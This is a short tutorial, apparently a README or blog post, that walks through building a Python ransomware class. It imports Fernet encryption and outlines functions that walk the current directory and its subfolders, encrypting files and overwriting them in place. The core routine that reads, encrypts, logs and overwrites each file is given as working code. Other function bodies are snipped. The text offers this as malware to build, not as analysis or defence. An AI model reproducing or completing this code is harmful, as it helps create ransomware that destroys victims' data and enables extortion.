Ransomeware is a type of malware that will encrypt every file it can get to, which can be devastating if the code gets to the main directory.

We'll use the os and sys modules to find all the files in the current directory and the ones in its subdirectories,
the fernet module to actually encrypt the files,
and the logging module to record everything.

```
import os, sys
import logging
from cryptography.fernet import Fernet
```
*Note: The logging module and the cryptography module will have to be installed*

*You can install them using*
```
$ pip install cryptography
$ pip install logging
```

We'll define a ransomeware class that will do all the encrypting

`class Ransomeware:`

In that class, we'll define some functions that will encrypt the files and the ones in the subdirectories

```
def Encrypt(self, file):
  --snip--

def FileEncrypt(self):
  --snip--
  
def FolderEncrypt(self)
  --snip--
 ```
 
 The Encrypt function will take a file, read and encrypt its content, then write it to the files.
 The FileEncrypt function will find every file in the directory and feed them to the Encrypt function to be encrypted.
 The FolderEncrypt function goes through every folder in that directory and every file in that folder and encrypts them
 
 The Encrypt function reads the file it's been given,
 reads and encrypts its content, logs it, 
 then writes the encrypted content to the file
 ```
 with open(file, 'rb') as file_name:
  Content = file_name.read()
  EncryptedContent = fernet.encrypt(Content)
  logging.info(f"File {file} has been encrypted")
  
  with open(file, 'wb') as file_name:
    file_name.write(EncryptedContent)
  ```
